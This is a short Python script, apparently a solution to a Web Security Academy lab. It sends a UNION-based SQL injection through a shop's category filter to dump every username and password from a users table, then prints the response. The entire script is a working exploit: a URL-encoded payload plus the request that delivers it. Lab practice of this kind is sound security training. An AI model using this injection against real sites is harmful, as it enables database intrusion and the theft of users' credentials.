import requests
from bs4 import BeautifulSoup

site = '0acc003004c12030d0bac91a00060023.web-security-academy.net'
user_table = 'users_qsyhrb'
username_col = 'username_falvvc'
password_col = 'password_bynnor'

s = requests.Session()

# Step 3: Dump all usernames and passwords
url = f'https://{site}/filter?category=Gifts%27%20UNION%20SELECT%20{username_col},{password_col}%20FROM%20{user_table}--+'
resp = s.get(url, verify=False)

print(resp.text)
